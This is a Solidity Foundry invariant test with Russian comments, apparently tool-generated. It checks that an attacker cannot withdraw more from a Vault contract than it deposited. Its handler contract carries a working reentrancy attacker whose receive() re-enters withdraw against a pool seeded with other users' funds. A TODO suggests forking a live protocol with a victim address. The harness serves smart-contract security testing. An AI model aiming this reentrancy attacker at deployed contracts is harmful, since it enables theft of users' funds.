// SPDX-License-Identifier: UNLICENSED
// Инвариант-харнесс SOLVENCY (no-overdraw), сгенерирован SCSA (Фаза B).
// цель: Vault — depozit `deposit`, вывод `withdraw` (строка 10)
// свойство: атакующий не может вывести больше, чем внёс (иначе крадёт засеянный
//           чужой TVL). ломается на reentrancy И на битом учёте/округлении.
// запуск: forge test --match-contract VaultSolvencyInvariant -vvv
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {Vault} from "../src/Vault.sol";

// Handler — атакующий-актор. forge дёргает его h_* в случайных
// последовательностях; реентрантный receive повторяет вывод (глубина <= MAX_DEPTH).
contract VaultHandler is Test {
    Vault public target;
    uint256 public constant STEP = 1 ether;
    uint256 public constant MAX_DEPTH = 3;
    uint256 public deposited;   // Σ внесённого атакующим
    uint256 public withdrawn;   // Σ выведенного атакующим (в т.ч. реентрантно)
    uint256 private _depth;

    constructor(Vault _t) { target = _t; }

    function h_deposit(uint256 amt) public {
        amt = bound(amt, 0.01 ether, 10 ether);
        vm.deal(address(this), address(this).balance + amt);
        try target.deposit{value: amt}() {
            deposited += amt;
        } catch {}
    }

    function h_withdraw() public {
        uint256 pre = address(this).balance;
        try target.withdraw() {} catch {}
        uint256 post = address(this).balance;
        if (post > pre) withdrawn += post - pre;   // прирост = выведенное
    }

    // реентрантный callback: пока есть что тянуть и глубина не исчерпана — заходим снова
    receive() external payable {
        if (_depth < MAX_DEPTH && address(target).balance >= STEP) {
            _depth++;
            try target.withdraw() {} catch {}
            _depth--;
        }
    }
}

contract VaultSolvencyInvariant is Test {
    Vault target;
    VaultHandler handler;
    uint256 constant SEED = 100 ether;   // чужой TVL в пуле (средства других юзеров)

    function setUp() public {
        // TODO(hunter): для боевого протокола — vm.createSelectFork(RPC, block) + адрес жертвы
        target = new Vault();
        vm.deal(address(target), SEED);   // засеваем «чужие» средства — их и попытается украсть handler
        handler = new VaultHandler(target);
        targetContract(address(handler));
    }

    // атакующий НЕ должен вывести больше, чем внёс. если смог (reentrancy / битый
    // учёт / округление) — withdrawn > deposited, инвариант падает, forge даёт
    // последовательность-контрпример = подтверждённый эксплойт.
    function invariant_noOverdraw() public view {
        assertLe(handler.withdrawn(), handler.deposited(), "attacker overdrew: TVL theft");
    }
}
